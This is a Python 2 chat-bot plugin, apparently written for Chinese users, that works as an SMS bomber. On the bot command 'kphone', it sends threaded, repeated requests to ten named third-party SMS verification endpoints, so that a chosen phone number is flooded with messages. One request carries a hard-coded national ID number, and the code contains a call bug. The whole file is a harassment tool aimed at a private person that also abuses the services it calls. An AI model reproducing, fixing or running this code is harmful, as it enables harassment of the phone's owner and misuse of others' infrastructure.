# coding:utf-8
import urllib
import urllib2
import cookielib
import time
import threading


def getTime():
    return str(time.time()).replace('.', '') + '0'


class CookieBrowser(object):
    # 构造方法，用来传递初值
    def __init__(self):
        self.cookie = cookielib.MozillaCookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie))
        self.opener.addheaders = [
            ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6')]

    def resetCookies(self):
        self.cookie = cookielib.CookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie))

    def readCookie(self, name):
        for c in self.cookie:
            if c.name == name:
                return c.value
        return ''

    def get(self, addr):
        return self.opener.open(addr, timeout=5).read()

    def post(self, url, param):
        postdata = ''
        if isinstance(param, basestring):
            postdata = param
        else:
            postdata = urllib.urlencode(param)
        return self.opener.open(url, postdata, timeout=5)


def getAddress(phone):
    address = [('post', 'http://wap.epet.com/api.html?cp=bdphone&do=sendCode&m=user&inajax=1',
                'cp=bdphone&do=sendCode&m=user&inajax=1&system=wap&version=1.0&postsubmit=r9b8s7m4&phone=' + phone),
               ('post', 'http://www.ds99.com/index.php/Login/regyzm', {'phone': phone}),
               ('post', 'http://wifi.gd118114.cn/getPassword.ajax',
                {'username': phone, 'accessType': '1', 'circleId': '100000055'}),
               ('post', 'http://app.loverscamera.com/user/tel/login/getCode.shtml', {'userPhone': phone}),
               ('post', 'http://m.58yiji.com/ajax/sendLoginCode.html', {'phone': phone}),
               ('post', 'http://m.meilijia.com/dispose.php?action=signup_mobile',
                'signup_mobile=' + phone + '&refer=&request_uri=%2Fsignin%2Fmobile%3Frefer%3D&http_referer=http%3A%2F%2Fm.meilijia.com%2Fsignin%3Faccount%3D15896541256%26refer%3D&from=2&code=2cbd5ed777fc3bddc5c2c499bc6dca25'),
               ('post', 'http://wx.bealinks.net/app/index.php?i=9&c=entry&p=login&do=auth&m=ewei_shop',
                {'phone': phone}),
               ('post', 'http://h5.vdangkou.com/h5/order.do?method=doSendCode', {'mobilePhone': phone}),
               ('post', 'http://m.68mall.com/register/sms-captcha',
                'mobile=' + phone + '&_csrf=UjFCZXhGTDIWBQdULzwrbWUcKyMBLwZCBWkKKSdxJ3EDQ3ozIX57Xg"%"3D"%"3D'),
               ('post', 'http://360.taikang.com/fcb/login/mobileIdentify',
                'action=get&cidnum=210106200004145813&mobnum=' + phone + '&work=reg')]
    return address


def doPost(url, postdata):
    brow = CookieBrowser()
    brow.opener.addheaders.append(('Referer', url))
    try:
        return brow.post(url, postdata)
    except Exception, e:
        # print e,url
        pass


def doGet(url, param):
    brow = CookieBrowser()
    brow.opener.addheaders.append(('Referer', url))
    try:
        return brow.get(url)
    except Exception, e:
        # print e,url
        pass


def kphone(number, lens):
    for method, addr, param in getAddress(number)[:lens]:
        if method == 'post':
            threading.Thread(target=doPost, args=(addr, param)).start()
        else:
            threading.Thread(target=doGet, args=(addr, param)).start()

def work(msg, info):
    if not msg.content.startswith('kphone'):
        return False
    if info.get('level', 3) < 3:
        try:
            _, phones = msg.content.strip().split(' ', 1)
            count = 1
            if phones.count(' ') > 0:
                count = phones.split(' ')[1]
                phones = phones.split(' ')[0]
            count = int(count)
            phones = int(phones)
            phones = str(phones)
            if len(phones) == 11:
                try:
                    msg.Reply('正在开始轰炸')
                    for x in xrange(count):
                        kphone(phones)
                        kphone(phones)
                        time.sleep(60)
                    return '轰炸%s结束' % phones
                except Exception, e:
                    return '轰炸出错咯。。'
            else:
                return '您的参数有误'
        except Exception, e:
            print e
            return help(info)
    else:
        return False


def help(info):
    if info.get('level', 3) < 3:
        return '#kphone 手机号 [分钟/次] 短信轰炸机'
